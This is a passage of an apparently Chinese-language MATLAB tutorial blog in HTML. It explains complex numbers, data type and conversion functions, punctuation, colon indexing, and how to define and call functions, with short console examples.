复数类型</h3><p>复数是指既包含实部又包含虚部的数，虚部的单位是 -1 的开平方根，在 MATLAB 中用字母 i 或 j 中的一个表示，i 和 j 的作用是完全一样的。即：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-number">2</span>+<span class="hljs-number">3</span><span class="hljs-built_in">i</span><br><span class="hljs-number">2</span>+<span class="hljs-number">3</span><span class="hljs-built_in">j</span><br><span class="hljs-comment">% 两者的结果是一样的</span><br></code></pre></div></td></tr></table></figure><p>复数的一般形式：C = a + bi（其中 C 为复数，a 和 b 均为实数，i 代表 -1 的开平方根。a、b 分别为 C 的实部和虚部。）</p><p>由于复数有两个部分，所以它能在平面内标出。这个平面的横轴是实轴，纵轴是虚轴，所以复数在这个平面内为一个点，横轴为 a，纵轴为 b。用上面的方式表示一个复数，称为直角坐标表示，坐标的横轴与纵轴分别代表复数的实部与虚部。</p><p>若复数在一个平面内，则有另一种表达方式，即极坐标表示：c = a + bi = z∠θ（其中 z 代表向量的模，θ 代表辐角。）</p><p>直角坐标中的 a、b 和极坐标 z、θ 之间的关系为：<br>a = z cosθ<br>b = z sinθ<br>z = (a<sup>2</sup>+b<sup>2</sup>)<sup>1/2</sup><br>θ = tan<sup>-1</sup> (b/a)</p><h4 id="2-5-1-创建复数"><a href="#2-5-1-创建复数" class="headerlink" title="2.5.1 创建复数"></a>2.5.1 创建复数</h4><p>在 MATLAB 中创建复数有两种方法：直接生成或者使用 complex() 函数生成。</p><h5 id="2-5-1-1-直接生成法"><a href="#2-5-1-1-直接生成法" class="headerlink" title="2.5.1.1 直接生成法"></a>2.5.1.1 直接生成法</h5><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x = <span class="hljs-number">2</span> + <span class="hljs-number">3</span><span class="hljs-built_in">i</span><br>x = <br>    <span class="hljs-number">2.0000</span> + <span class="hljs-number">3.0000</span><span class="hljs-built_in">i</span><br></code></pre></div></td></tr></table></figure><p>所谓直接生成，也就是将复数直接写出来。</p><h5 id="2-5-1-2-使用-complex-函数生成"><a href="#2-5-1-2-使用-complex-函数生成" class="headerlink" title="2.5.1.2 使用 complex() 函数生成"></a>2.5.1.2 使用 complex() 函数生成</h5><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x=<span class="hljs-number">2</span><br>&gt;&gt; y=<span class="hljs-number">4</span><br>&gt;&gt; z=<span class="hljs-built_in">complex</span>(x, y)<br><br>z =<br>    <span class="hljs-number">2.0000</span> + <span class="hljs-number">4.0000</span><span class="hljs-built_in">i</span><br></code></pre></div></td></tr></table></figure><p>其中 x、y 为实数，得到的 z 是以 x 为实部，y 为虚部的复数。<br>也可以这样使用 complex()  函数：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x=<span class="hljs-number">2</span><br>&gt;&gt; z=<span class="hljs-built_in">complex</span>(x)<br><br>z =<br>    <span class="hljs-number">2.0000</span> + <span class="hljs-number">0.0000</span><span class="hljs-built_in">i</span><br></code></pre></div></td></tr></table></figure><p>其中 x 为实数，得到的 z 是以 x 为实部，以 0 为虚部的复数。</p><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; x = <span class="hljs-built_in">rand</span>(<span class="hljs-number">3</span>) * <span class="hljs-number">5</span>;<br>&gt;&gt; y= <span class="hljs-built_in">rand</span>(<span class="hljs-number">3</span>) * <span class="hljs-number">-8</span>;<br>&gt;&gt; z = <span class="hljs-built_in">complex</span>(x,y)<br>z = <br>    <span class="hljs-number">4.0736</span> - <span class="hljs-number">7.7191</span><span class="hljs-built_in">i</span>  <span class="hljs-number">4.5669</span> - <span class="hljs-number">7.6573</span><span class="hljs-built_in">i</span>  <span class="hljs-number">1.3925</span> - <span class="hljs-number">1.1351</span><span class="hljs-built_in">i</span><br>    <span class="hljs-number">4.5290</span> - <span class="hljs-number">1.2609</span><span class="hljs-built_in">i</span>  <span class="hljs-number">3.1618</span> - <span class="hljs-number">3.8830</span><span class="hljs-built_in">i</span>  <span class="hljs-number">2.7344</span> - <span class="hljs-number">3.3741</span><span class="hljs-built_in">i</span><br>    <span class="hljs-number">0.6349</span> - <span class="hljs-number">7.7647</span><span class="hljs-built_in">i</span>  <span class="hljs-number">0.4877</span> - <span class="hljs-number">6.4022</span><span class="hljs-built_in">i</span>  <span class="hljs-number">4.7875</span> - <span class="hljs-number">7.3259</span><span class="hljs-built_in">i</span><br></code></pre></div></td></tr></table></figure><p>应用 rand(3) 函数生成 3×3 的随机数矩阵。通过 real() 和 imag() 函数可以把复数分为实数和虚数部分。<br>常见的支持复数运算的 MATLAB 函数。如表。</p><table><thead><tr><th align="center">函数名</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>conj(c)</code></td><td align="center">计算 c 的共轭复数，如果 c=a+bi，那么 conj(c)=a-bi</td></tr><tr><td align="center"><code>real(c)</code></td><td align="center">返回复数 c 的实部</td></tr><tr><td align="center"><code>imag(c)</code></td><td align="center">返回复数 c 的虚部</td></tr><tr><td align="center"><code>isreal(c)</code></td><td align="center">如果数组 c 中没有一个元素有虚部，函数 isreal(c) 将返回 1；所以如果一个数组 c 是 复数组成，那么 isreal(c) 将返回 0</td></tr><tr><td align="center"><code>abs(c)</code></td><td align="center">返回复数 c 的模</td></tr><tr><td align="center"><code>angle(c)</code></td><td align="center">返回复数 c 的幅角</td></tr></tbody></table><h4 id="2-5-2-数据类型函数"><a href="#2-5-2-数据类型函数" class="headerlink" title="2.5.2 数据类型函数"></a>2.5.2 数据类型函数</h4><table><thead><tr><th align="center">函数名</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>double</code></td><td align="center">创建或转化为双精度数据类型</td></tr><tr><td align="center"><code>single</code></td><td align="center">创建或转化为单精度数据类型</td></tr><tr><td align="center"><code>int8</code>，<code>int16</code>，<code>int32</code>，<code>int64</code></td><td align="center">创建或转化为有符号整数数据类型</td></tr><tr><td align="center"><code>uint8</code>，<code>uint16</code>，<code>uint32</code>，<code>uint64</code></td><td align="center">创建或转化为无符号整数数据类型</td></tr><tr><td align="center"><code>isnumeric</code></td><td align="center">若是整数或浮点数据类型，返回 true</td></tr><tr><td align="center"><code>isinteger</code></td><td align="center">若是整数数据类型，返回 true</td></tr><tr><td align="center"><code>isfloat</code></td><td align="center">若是单精度或双精度数据类型，返回 true</td></tr><tr><td align="center"><code>isa(x,&#39;type&#39;)</code></td><td align="center">type 包括 numeric、integer 和 float，当 x 类型为 type 时，返回 true</td></tr><tr><td align="center"><code>case(x,&#39;type&#39;)</code></td><td align="center">将 x 类型置为 type</td></tr><tr><td align="center"><code>intmax(&#39;type&#39;)</code></td><td align="center">type 数据类型的最大整数值</td></tr><tr><td align="center"><code>intmin(&#39;type&#39;)</code></td><td align="center">type 数据类型的最小整数值</td></tr><tr><td align="center"><code>realmax(&#39;type&#39;)</code></td><td align="center">type 数据类型的最大浮点实数值</td></tr><tr><td align="center"><code>realmin(&#39;type&#39;)</code></td><td align="center">type 数据类型的最小浮点实数值</td></tr><tr><td align="center"><code>eps(&#39;type&#39;)</code></td><td align="center">type 数据类型的 eps 值（浮点值）</td></tr><tr><td align="center"><code>eps(x)</code></td><td align="center">x 的 eps 值，即 x 与 MATLAB 能表示的和其相邻的同数据类型的那个数之间的距离</td></tr><tr><td align="center"><code>zeros(...,&#39;type&#39;)</code></td><td align="center">创建数据类型为 type 的全 0 阵列</td></tr><tr><td align="center"><code>ones(...,&#39;type&#39;)</code></td><td align="center">创建数据类型为 type 的全 1 阵列</td></tr><tr><td align="center"><code>eye(...,&#39;type&#39;)</code></td><td align="center">创建数据类型为 type 的单位阵列</td></tr></tbody></table><h3 id="2-6-标点符号"><a href="#2-6-标点符号" class="headerlink" title="2.6 标点符号"></a>2.6 标点符号</h3><p>MATLAB 中分号、冒号、逗号等常用标点符号的作用如表。</p><table><thead><tr><th align="center">名称</th><th align="center">符号</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center"></td><td align="center">用于输入变量之间的分隔符以及数组行元素之间的分隔符</td></tr><tr><td align="center">逗号</td><td align="center"><code>,</code></td><td align="center">用于要显示计算结果的命令之间的分隔符；用于输入变量之间的分隔符；用于数组行元素之间的分隔符</td></tr><tr><td align="center">点号</td><td align="center"><code>.</code></td><td align="center">用于数值中的小数点</td></tr><tr><td align="center">分号</td><td align="center"><code>;</code></td><td align="center">用于不显示命令行的结尾；用于不显示结果直接的分隔符；用户数组行元素之间的分隔</td></tr><tr><td align="center">冒号</td><td align="center"><code>:</code></td><td align="center">用于生成一维数值数组，表示一维数值的全部元素或多维数组某一维的全部元素</td></tr><tr><td align="center">百分号</td><td align="center"><code>%</code></td><td align="center">用于注释的前面，在它后面的命令不需要执行</td></tr><tr><td align="center">单引号</td><td align="center"><code>&#39;</code></td><td align="center">用于括住字符串</td></tr><tr><td align="center">圆括号</td><td align="center"><code>()</code></td><td align="center">用于引用数组元素；用于函数输入变量列表；用于确定算术运算的先后次序</td></tr><tr><td align="center">方括号</td><td align="center"><code>[]</code></td><td align="center">用于构成向量和矩阵；用于函数输出列表</td></tr><tr><td align="center">花括号</td><td align="center"><code>&#123;&#125;</code></td><td align="center">用于构成元胞数组</td></tr><tr><td align="center">下划线</td><td align="center"><code>_</code></td><td align="center">用于一个变量、函数或文件名的连字符</td></tr><tr><td align="center">续行号</td><td align="center"><code>...</code></td><td align="center">用于把后面的行与该行连接以构成一个较长的命令</td></tr><tr><td align="center">“@”号</td><td align="center"><code>@</code></td><td align="center">用于放在函数名前形成函数句柄；用于放在目录名前形成用户对象类目录</td></tr></tbody></table><h4 id="2-6-1-冒号（-）的常用方法"><a href="#2-6-1-冒号（-）的常用方法" class="headerlink" title="2.6.1 冒号（:）的常用方法"></a>2.6.1 冒号（:）的常用方法</h4><blockquote><ol><li>a:b表示 [a,a+1,…,b]。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = <span class="hljs-number">1</span>:<span class="hljs-number">6</span><br>A = <br>    <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>如果 b 和 a 不是整数，则向量的最后一位数是 n+a，且 n=fix(b-a)。(a&lt;b)</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = <span class="hljs-number">1.2</span>:<span class="hljs-number">5.2</span><br>A = <br>    <span class="hljs-number">1.2000</span> <span class="hljs-number">2.2000</span> <span class="hljs-number">3.2000</span> <span class="hljs-number">4.2000</span> <span class="hljs-number">5.2000</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>上面的前提是 a&lt;b，如果 a&gt;b 则会出现空值。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = <span class="hljs-number">6</span>:<span class="hljs-number">1</span><br>A = <br>    空的 <span class="hljs-number">1</span>x0 double 行矢量<br></code></pre></div></td></tr></table></figure><p>此时， A 是空矩阵，从工作区也可以看到 A。</p><blockquote><ol start="4"><li>a : b : c表示 [a,a+c,…,a+n*c]，其中 n=fix((b-a)/c)。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = <span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">11</span><br>A = <br>    <span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>A(:)表示以一列的方式显示 A 中的所有元素。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>;<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>A = <br>    <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br>    <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br>&gt;&gt; A(:)<br><span class="hljs-built_in">ans</span> = <br>    <span class="hljs-number">1</span><br>    <span class="hljs-number">4</span><br>    <span class="hljs-number">2</span><br>    <span class="hljs-number">5</span><br>    <span class="hljs-number">3</span><br>    <span class="hljs-number">6</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>b=A(i,:)表示把矩阵 A 的第 i 行存入 b。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; b = A(<span class="hljs-number">1</span>,:)<br>b = <br>    <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="7"><li>b=A(:,j)表示把矩阵 A 的第 j 列存入 b。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; b = A(;,<span class="hljs-number">1</span>)<br>b = <br>    <span class="hljs-number">1</span><br>    <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="8"><li>b=A(J:K)表示把矩阵 A 中 [A(J), A(J+1),…,A(K)] 这些元素存入 b 中。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; b = A(<span class="hljs-number">3</span>:<span class="hljs-number">5</span>)<br>b = <br>    <span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="9"><li>b=A(:,c.d)表示把矩阵 A 的第 c 列到第 d 列存入 b 中，当然 c、d 大于 A 的列数则出错（b=A(c:d,:) 表示取行）。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; A = [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>;<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>;<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>A = <br>    <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br>    <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br>    <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span><br>&gt;&gt; b=A(:,<span class="hljs-number">2</span>:<span class="hljs-number">3</span>)<br>b = <br>    <span class="hljs-number">2</span> <span class="hljs-number">3</span> <br>    <span class="hljs-number">5</span> <span class="hljs-number">6</span><br>    <span class="hljs-number">8</span> <span class="hljs-number">9</span><br></code></pre></div></td></tr></table></figure><h3 id="2-7-数据类型转换"><a href="#2-7-数据类型转换" class="headerlink" title="2.7 数据类型转换"></a>2.7 数据类型转换</h3><p>将一种数据类型转换为另一种数据类型的函数。</p><table><thead><tr><th align="center">函数</th><th align="center">描述说明</th></tr></thead><tbody><tr><td align="center"><code>char</code></td><td align="center">转换为字符数组(字符串)</td></tr><tr><td align="center"><code>int2str</code></td><td align="center">将整数数据转换为字符串</td></tr><tr><td align="center"><code>mat2str</code></td><td align="center">将矩阵转换为字符串</td></tr><tr><td align="center"><code>num2str</code></td><td align="center">将数字转换为字符串</td></tr><tr><td align="center"><code>str2double</code></td><td align="center">将字符串转换为双精度值</td></tr><tr><td align="center"><code>str2num</code></td><td align="center">将字符串转换为数字</td></tr><tr><td align="center"><code>native2unicode</code></td><td align="center">将数字字节转换为Unicode字符</td></tr><tr><td align="center"><code>unicode2native</code></td><td align="center">将Unicode字符转换为数字字节</td></tr><tr><td align="center"><code>base2dec</code></td><td align="center">将基数N字符串转换为十进制数</td></tr><tr><td align="center"><code>bin2dec</code></td><td align="center">将二进制数字串转换为十进制数</td></tr><tr><td align="center"><code>dec2base</code></td><td align="center">将十进制转换为字符串中的N数字</td></tr><tr><td align="center"><code>dec2bin</code></td><td align="center">将十进制转换为字符串中的二进制数</td></tr><tr><td align="center"><code>dec2hex</code></td><td align="center">将十进制转换为十六进制数字</td></tr><tr><td align="center"><code>hex2dec</code></td><td align="center">将十六进制数字字符串转换为十进制数</td></tr><tr><td align="center"><code>hex2num</code></td><td align="center">将十六进制数字字符串转换为双精度数字</td></tr><tr><td align="center"><code>num2hex</code></td><td align="center">将单数转换为IEEE十六进制字符串</td></tr><tr><td align="center"><code>cell2mat</code></td><td align="center">将单元格数组转换为数组</td></tr><tr><td align="center"><code>cell2struct</code></td><td align="center">将单元格数组转换为结构数组</td></tr><tr><td align="center"><code>cellstr</code></td><td align="center">从字符数组创建字符串数组</td></tr><tr><td align="center"><code>mat2cell</code></td><td align="center">将数组转换为具有潜在不同大小的单元格的单元阵列</td></tr><tr><td align="center"><code>num2cell</code></td><td align="center">将数组转换为具有一致大小的单元格的单元阵列</td></tr><tr><td align="center"><code>struct2cell</code></td><td align="center">将结构转换为单元格数组</td></tr></tbody></table><h3 id="2-8-数据类型确定"><a href="#2-8-数据类型确定" class="headerlink" title="2.8 数据类型确定"></a>2.8 数据类型确定</h3><p>用于识别变量数据类型的各种函数。</p><table><thead><tr><th align="center">函数</th><th align="center">描述说明</th></tr></thead><tbody><tr><td align="center"><code>is</code></td><td align="center">检测状态</td></tr><tr><td align="center"><code>isa</code></td><td align="center">确定输入是否是指定类的对象</td></tr><tr><td align="center"><code>iscell</code></td><td align="center">确定输入是单元格数组</td></tr><tr><td align="center"><code>iscellstr</code></td><td align="center">确定输入是字符串的单元格数组</td></tr><tr><td align="center"><code>ischar</code></td><td align="center">确定项目是否是字符数组</td></tr><tr><td align="center"><code>isfield</code></td><td align="center">确定输入是否是结构数组字段</td></tr><tr><td align="center"><code>isfloat</code></td><td align="center">确定输入是否为浮点数组</td></tr><tr><td align="center"><code>ishghandle</code></td><td align="center">确定是否用于处理图形对象句柄</td></tr><tr><td align="center"><code>isinteger</code></td><td align="center">确定输入是否为整数数组</td></tr><tr><td align="center"><code>isjava</code></td><td align="center">确定输入是否为Java对象</td></tr><tr><td align="center"><code>islogical</code></td><td align="center">确定输入是否为逻辑数组</td></tr><tr><td align="center"><code>isnumeric</code></td><td align="center">确定输入是否是数字数组</td></tr><tr><td align="center"><code>isobject</code></td><td align="center">确定输入是否为MATLAB对象</td></tr><tr><td align="center"><code>isreal</code></td><td align="center">检查输入是否为实数数组</td></tr><tr><td align="center"><code>isscalar</code></td><td align="center">确定输入是否为标量</td></tr><tr><td align="center"><code>isstr</code></td><td align="center">确定输入是否是字符数组</td></tr><tr><td align="center"><code>isstruct</code></td><td align="center">确定输入是否是结构数组</td></tr><tr><td align="center"><code>isvector</code></td><td align="center">确定输入是否为向量</td></tr><tr><td align="center"><code>class</code></td><td align="center">确定对象的类</td></tr><tr><td align="center"><code>validateattributes</code></td><td align="center">检查数组的有效性</td></tr><tr><td align="center"><code>whos</code></td><td align="center">在工作区中列出变量，其大小和类型</td></tr></tbody></table><p>示例：创建脚本文件</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = <span class="hljs-number">3</span><br>isinteger(x)<br>isfloat(x)<br><span class="hljs-built_in">isvector</span>(x)<br><span class="hljs-built_in">isscalar</span>(x)<br>isnumeric(x)<br><br>x = <span class="hljs-number">23.54</span><br>isinteger(x)<br>isfloat(x)<br><span class="hljs-built_in">isvector</span>(x)<br><span class="hljs-built_in">isscalar</span>(x)<br>isnumeric(x)<br><br>x = [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>isinteger(x)<br>isfloat(x)<br><span class="hljs-built_in">isvector</span>(x)<br><span class="hljs-built_in">isscalar</span>(x)<br><br>x = <span class="hljs-string">&#x27;Hello&#x27;</span><br>isinteger(x)<br>isfloat(x)<br><span class="hljs-built_in">isvector</span>(x)<br><span class="hljs-built_in">isscalar</span>(x)<br>isnumeric(x)<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = <span class="hljs-number">3</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br>x = <span class="hljs-number">1177</span>/<span class="hljs-number">50</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br>x =<br><br>          <span class="hljs-number">1</span>          <span class="hljs-number">2</span>          <span class="hljs-number">3</span><br><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br>x = Hello<br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">1</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">ans</span> = <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h2 id="3-函数"><a href="#3-函数" class="headerlink" title="3.函数"></a>3.函数</h2><h3 id="3-1-函数基本结构"><a href="#3-1-函数基本结构" class="headerlink" title="3.1 函数基本结构"></a>3.1 函数基本结构</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> 输出形参表 = 函数名<span class="hljs-params">(输入形参表)</span></span><br>注释说明部分<br>函数体语句<br></code></pre></div></td></tr></table></figure><p>当有多个形参时，形参之间用逗号分隔，组成形参表。当输出形参多余一个时，应该用方括号括起来，构成一个输出矩阵。</p><ul><li><p>函数文件名：通常由函数名再加上扩展名 .m 组成，函数文件名与函数名也可以不相同。但一般情况这两个名字都相同。</p></li><li><p>return 语句表示结束函数的执行。</p></li></ul><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">[s,p]</span> = <span class="hljs-title">fc</span><span class="hljs-params">(r)</span></span><br>s=<span class="hljs-built_in">pi</span>*r*r;<br>p=<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*r; <br></code></pre></div></td></tr></table></figure><h3 id="3-2-函数调用"><a href="#3-2-函数调用" class="headerlink" title="3.2 函数调用"></a>3.2 函数调用</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[输出实参表] = 函数名(输入实参表)<br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[s,p]=fc(<span class="hljs-number">10</span>)<br></code></pre></div></td></tr></table></figure><h3 id="3-3-匿名函数"><a href="#3-3-匿名函数" class="headerlink" title="3.3 匿名函数"></a>3.3 匿名函数</h3><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">函数句柄变量 = @(匿名函数输入参数) 匿名函数表达式 <span class="hljs-comment">% @是函数句柄的运算符；函数句柄变量也相当于是函数的别名，见下面第一条。</span><br></code></pre></div></td></tr></table></figure><p>示例：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; f=@(x,y) x*<span class="hljs-number">2</span>+y*<span class="hljs-number">3</span><br><br>f =<br><br>    @(x,y)x*<span class="hljs-number">2</span>+y*<span class="hljs-number">3</span><br><br>&gt;&gt; f(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)<br><br><span class="hljs-built_in">ans</span> =<br><br>    <span class="hljs-number">13</span><br></code></pre></div></td></tr></table></figure><p><strong>类似于带参宏定义！</strong></p><blockquote><ol><li>给已经存在的函数定义函数句柄</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 